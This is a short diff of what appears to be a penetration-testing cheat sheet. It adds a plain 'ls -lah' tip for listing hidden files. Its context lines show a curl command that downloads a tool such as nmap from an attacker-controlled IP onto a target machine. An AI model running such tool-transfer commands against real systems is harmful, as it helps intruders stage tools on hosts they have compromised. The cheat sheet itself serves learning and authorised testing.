@@ -20,3 +20,10 @@ curl <attacker_IP>/<tool_name> -o <out_name>
 ```
 curl 10.50.88.33/nmap -o nmap_sar
 ```
+
+
+To see hidden files 
+```
+cd / && ls -lah
+```
+
